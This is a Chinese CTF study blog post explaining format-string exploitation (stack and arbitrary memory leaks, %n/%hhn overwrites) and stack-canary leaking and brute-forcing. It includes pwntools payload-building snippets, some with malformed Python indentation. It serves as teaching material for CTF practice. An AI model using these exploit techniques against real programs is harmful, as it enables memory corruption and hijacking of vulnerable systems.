---
title: pwn学习记录（其四）
tags:
  - CTF
  - pwn
categories:
  - CTF
abbrlink: 2a691734
date: 2025-11-13 00:00:00
---
> 从冬季培训的pwn题fmt中受益匪浅
# 格式化字符串漏洞
## 介绍
格式化字符串的基本格式
```%[parameter][flags][field width][.precision][length]type```
其中
* parameter 
    * n$ 可以获取格式化字符串中的指定参数
* length 输出的长度
    * hh 输出一个字节
    * h 输出一个双字节
* type
    * s 如果没有用 l 标志，输出 null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。
    * c 如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。
    * p 打印对应变量的值
    * n 不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量
## 漏洞原理
对于

    Input:printf("Color %s, Number %d, Float %4.2f","red",123456,3.14);
    output:Color red,Number 123456,Float 3.14

也就是说，在进入printf后，函数首先获取第一个参数，一个一个个读字符后会遇到两种情况
* 当前字符不是%，直接输出
* 当前字符是%，继续读取下一个字符
    * 如果没有字符，报错
    * 如果下一个字符是%，输出%
    * 否则根据相应的字符，获得相应的参数，输出
## 利用
所以，格式化字符串漏洞可以使程序崩溃，或者查看进程内容
## 程序崩溃
利用格式化字符串漏洞使程序崩溃是最简单的利用方式，只需要输入若干个%s即可，因为栈上不可能每个值都对应合法的地址，总有地址可以使程序崩溃。
## 泄露内存
* 泄露栈内存 可以获取栈上某个变量的值或对应地址的内存
* 泄露任意地址内存 利用GOT表获得libc函数地址，进而获取libc，再获取其他libc函数地址
### 泄露栈内存
通过格式化字符串可以获取栈上变量的值
如果输入```AAA %p %p %p %p %p...```
再调用printf函数，就能依次获得栈中的每个参数，同时也可以知道输入的字符串被放在栈上的第几个参数处
当然，通过```%n$x```
就可以直接获得栈上的第n+1个参数
而通过%s，则可以获得栈变量对应的字符串
>不过平时推荐用%p,可以不考虑位数和零截断的问题
### 泄露任意地址内存
将需要泄露函数的GOT表放入栈中，通过%n$s打印地址，就可以获取指定地址的内容
但是需要注意的是，如果格式化字符串在栈上，就要确定格式化字符串的相对偏移，因为在函数调用时栈指针至少低于格式化字符串地址 8 字节或者 16 字节。
可以通过上文泄露栈内存中提到的方法确定，也可以通过动态调试找到
## 覆盖内存
同理，通过%n可以修改栈上甚至任意地址变量的内存
基本格式为```f"%{value}c%[offset]$hn".encode()+p64(addr)```
value中为要覆盖的内容，offset为要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数，addr为所要覆盖的地址
## 覆盖栈内存
通过动态调试找到偏移量在构造payload进行修改
## 覆盖任意地址内存
### 覆盖小数字
对于小数字，与上文中读取类似，将地址和内容放入栈中即可
要注意的是，填充字符使字节对齐
### 覆盖大数字
利用%hhn向地址写入单字节或用%hn向地址中写如双字节
分次放入
从网上获得基本构造如下

    def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr

    def fmt_str(offset, size, addr, target):
        payload = ""
        for i in range(4):
            if size == 4:
                payload += p32(addr + i)
            else:
                payload += p64(addr + i)
        prev = len(payload)
        for i in range(4):
            payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
            prev = (target >> i * 8) & 0xff
        return payload
    payload = fmt_str(6,4,0x0804A028,0x12345678)
其中每个参数的含义基本如下
* offset 表示要覆盖的地址最初的偏移
* size 表示机器字长
* addr 表示将要覆盖的地址。
* target 表示我们要覆盖为的目的变量值。

# canary绕过
## canary介绍
栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让 shellcode 能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变)，如果不合法就停止程序运行 (栈溢出发生)。攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。
这个值储存在rbp-8的地方
## canary泄露
可以通过格式化字符串泄露canary信息
或者首先通过覆盖Canary最后一个\x00字节来打印出4位的Canary之后，计算好偏移，将Canary填入到相应的溢出位置，实现Ret到getshell函数中

    # leak Canary
    payload = "A"*offset
    io.sendline(payload)
    io.recvuntil("A"*offset)
    Canary = u32(io.recv(4))-0xa
    log.info("Canary:"+hex(Canary))
也可以在子进程中逐字节爆破canary
    print "[+] Brute forcing stack canary "
    start = len(p)
    stop = len(p)+8
    while len(p) < stop:
        for i in xrange(0,256):
        res = send2server(p + chr(i))

        if res != "":
            p = p + chr(i)
            #print "\t[+] Byte found 0x%02x" % i
            break

          if i == 255:
            print "[-] Exploit failed"
            sys.exit(-1)
    canary = p[stop:start-1:-1].encode("hex")
    print "   [+] SSP value is 0x%s" % canary
## canary绕过
在获得canary后只需要在填充栈和缓冲区的字节间加上canary即可
